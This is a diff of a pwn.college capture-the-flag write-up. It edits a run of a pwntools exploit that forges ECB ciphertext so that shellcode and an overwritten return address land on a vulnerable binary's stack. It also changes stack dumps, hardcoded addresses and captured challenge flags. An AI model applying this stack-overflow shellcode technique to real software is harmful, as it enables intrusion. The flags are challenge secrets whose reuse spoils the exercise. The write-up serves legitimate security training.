@@ -1071,11 +1071,10 @@ p.interactive()
 ```
 
 ```
-hacker@integrated-security~ecb-to-shellcode-easy:~$ code ~/script.py 
-hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py 
+hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py
 [*] Harvesting ciphertext blocks from the ECB encryption oracle...
 [*] Dispatching assembled ciphertext (16 bytes) to target...
-[+] Starting local process '/challenge/vulnerable-overflow': pid 905
+[+] Starting local process '/challenge/vulnerable-overflow': pid 1281
 [*] Switching to interactive mode
 Your message header: VERIFIED\x01
 Your message length: 1
@@ -1085,36 +1084,36 @@ ERROR: Failed to disassemble shellcode! Bytes are:
 
       Address      |                      Bytes
 --------------------------------------------------------------------
-0x00007fffffffe570 | 00 00 00 00 00 00 00 00 00 00 00 [*] Process '/challenge/vulnerable-overflow' stopped with exit code 0 (pid 905)
-00 00 00 00 00 
+0x00007fffffffe550 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
 
 +---------------------------------+-------------------------+--------------------+
 |                  Stack location |            Data (bytes) |      Data (LE int) |
 +---------------------------------+-------------------------+--------------------+
-| 0x00007fffffffe530 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe538 (rsp+0x0008) | f8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6f8 |
-| 0x00007fffffffe540 (rsp+0x0010) | e8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6e8 |
-| 0x00007fffffffe548 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
-| 0x00007fffffffe550 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe558 (rsp+0x0028) | 25 05 b5 f6 00 00 00 00 | 0x00000000f6b50525 |
-| 0x00007fffffffe560 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
-| 0x00007fffffffe568 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
-| 0x00007fffffffe570 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe578 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe580 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe588 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe590 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe598 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe5a0 (rsp+0x0070) | 60 1e 40 00 00 00 00 00 | 0x0000000000401e60 |
-| 0x00007fffffffe5a8 (rsp+0x0078) | 10 00 00 00 00 00 00 00 | 0x0000000000000010 |
-| 0x00007fffffffe5b0 (rsp+0x0080) | 60 54 40 00 00 00 00 00 | 0x0000000000405460 |
-| 0x00007fffffffe5b8 (rsp+0x0088) | e0 e6 ff ff 03 00 00 00 | 0x00000003ffffe6e0 |
-| 0x00007fffffffe5c0 (rsp+0x0090) | f0 e5 ff ff ff 7f 00 00 | 0x00007fffffffe5f0 |
-| 0x00007fffffffe5c8 (rsp+0x0098) | 58 1e 40 00 00 00 00 00 | 0x0000000000401e58 |
+| 0x00007fffffffe510 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe518 (rsp+0x0008) | d8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6d8 |
+| 0x00007fffffffe520 (rsp+0x0010) | c8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6c8 |
+| 0x00007fffffffe528 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
+| 0x00007fffffffe530 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe538 (rsp+0x0028) | 25 05 b5 f6 00 00 00 00 | 0x00000000f6b50525 |
+| 0x00007fffffffe540 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
+| 0x00007fffffffe548 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007fffffffe550 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe558 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe560 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe568 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe570 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe578 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe580 (rsp+0x0070) | 60 1e 40 00 00 00 00 00 | 0x0000000000401e60 |
+| 0x00007fffffffe588 (rsp+0x0078) | 10 00 00 00 00 00 00 00 | 0x0000000000000010 |
+| 0x00007fffffffe590 (rsp+0x0080) | 60 54 40 00 00 00 00 00 | 0x0000000000405460 |
+| 0x00007fffffffe598 (rsp+0x0088) | c0 e6 ff ff 03 00 00 00 | 0x00000003ffffe6c0 |
+| 0x00007fffffffe5a0 (rsp+0x0090) | d0 e5 ff ff ff 7f 00 00 | 0x00007fffffffe5d0 |
+| 0x00007fffffffe5a8 (rsp+0x0098) | 58 1e 40 00 00 00 00 00 | 0x0000000000401e58 |
 +---------------------------------+-------------------------+--------------------+
 The program's memory status:
-- the input buffer starts at 0x7fffffffe570
-- the saved return address (previously to main) is at 0x7fffffffe5c8
+- the input buffer starts at 0x7fffffffe550
+- the saved return address (previously to main) is at 0x7fffffffe5a8
+[*] Process '/challenge/vulnerable-overflow' stopped with exit code 0 (pid 1281)
 [*] Got EOF while reading in interactive
 $  
 ```
@@ -1134,8 +1133,8 @@ context.os = "linux"
 context.log_level = "error"
 
 # Initialize values
-buffer_addr = 0x7fffffffe570
-addr_of_saved_ip = 0x7fffffffe5c8 
+buffer_addr = 0x7fffffffe550
+addr_of_saved_ip = 0x7fffffffe5a8 
 shellcode_addr = buffer_addr
 
 # Calculate offset & number of padding blocks
@@ -1203,51 +1202,51 @@ p.interactive()
 ```
 
 ```
-hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py 
+hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py
 [*] Harvesting ciphertext blocks from the ECB encryption oracle...
-[*] Dispatching assembled ciphertext (144 bytes) to target...
+[*] Dispatching assembled ciphertext (128 bytes) to target...
 Your message header: VERIFIED\x01
 Your message length: 1
-Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCp\xe5\xff\xff\xff\x7f!
+Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCP\xe5\xff\xff\xff\x7f!
 You've loaded the following shellcode into your message:
 ERROR: Failed to disassemble shellcode! Bytes are:
 
       Address      |                      Bytes
 --------------------------------------------------------------------
-0x00007fffffffe570 | 6a 5a 54 5f 58 40 b6 04 0f 05 90 90 90 90 90 90 
+0x00007fffffffe550 | 6a 5a 54 5f 58 40 b6 04 0f 05 90 90 90 90 90 90 
 
 +---------------------------------+-------------------------+--------------------+
 |                  Stack location |            Data (bytes) |      Data (LE int) |
 +---------------------------------+-------------------------+--------------------+
-| 0x00007fffffffe530 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe538 (rsp+0x0008) | f8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6f8 |
-| 0x00007fffffffe540 (rsp+0x0010) | e8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6e8 |
-| 0x00007fffffffe548 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
-| 0x00007fffffffe550 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fffffffe558 (rsp+0x0028) | 25 05 b5 f6 01 00 00 00 | 0x00000001f6b50525 |
-| 0x00007fffffffe560 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
-| 0x00007fffffffe568 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
-| 0x00007fffffffe570 (rsp+0x0040) | 6a 5a 54 5f 58 40 b6 04 | 0x04b640585f545a6a |
-| 0x00007fffffffe578 (rsp+0x0048) | 0f 05 90 90 90 90 90 90 | 0x909090909090050f |
-| 0x00007fffffffe580 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe588 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe590 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe598 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe5a0 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe5a8 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe5b0 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe5b8 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe5c0 (rsp+0x0090) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fffffffe5c8 (rsp+0x0098) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe510 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe518 (rsp+0x0008) | d8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6d8 |
+| 0x00007fffffffe520 (rsp+0x0010) | c8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6c8 |
+| 0x00007fffffffe528 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
+| 0x00007fffffffe530 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe538 (rsp+0x0028) | 25 05 b5 f6 01 00 00 00 | 0x00000001f6b50525 |
+| 0x00007fffffffe540 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
+| 0x00007fffffffe548 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007fffffffe550 (rsp+0x0040) | 6a 5a 54 5f 58 40 b6 04 | 0x04b640585f545a6a |
+| 0x00007fffffffe558 (rsp+0x0048) | 0f 05 90 90 90 90 90 90 | 0x909090909090050f |
+| 0x00007fffffffe560 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe568 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe570 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe578 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe580 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe588 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe590 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe598 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe5a0 (rsp+0x0090) | 43 43 43 43 43 43 43 43 | 0x4343434343434343 |
+| 0x00007fffffffe5a8 (rsp+0x0098) | 50 e5 ff ff ff 7f 00 00 | 0x00007fffffffe550 |
 +---------------------------------+-------------------------+--------------------+
 The program's memory status:
-- the input buffer starts at 0x7fffffffe570
-- the saved return address (previously to main) is at 0x7fffffffe5c8
+- the input buffer starts at 0x7fffffffe550
+- the saved return address (previously to main) is at 0x7fffffffe5a8
 $  
 ```
 
 ```
-hacker@integrated-security~ecb-to-shellcode-easy:~$ cat ~/Z
+hacker@integrated-security~ecb-to-shellcode-easy:~$ cat /flag
 pwn.college{8sn6D2nxMYonmCE6lgbNgdP45f9.QX5UDMxEDL4ITM0EzW}
 ```
 
@@ -1907,11 +1906,11 @@ $
 ```
 
 ```
-hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ cat ~/Z
+hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ cat /flag
 pwn.college{practice}
 ```
 
-Great!
+Great!!
 The same script will work in the non-practice mode as the binary is non-PIE.
 
 ```
@@ -1923,6 +1922,6 @@ $
 ```
 
 ```
-hacker@integrated-security~ecb-to-shellcode-hard:~$ cat ~/Z
+hacker@integrated-security~ecb-to-shellcode-hard:~$ cat /flag
 pwn.college{wmHupm0Wp3hQROeesdi06fN4QYC.QXwYDMxEDL4ITM0EzW}
 ```
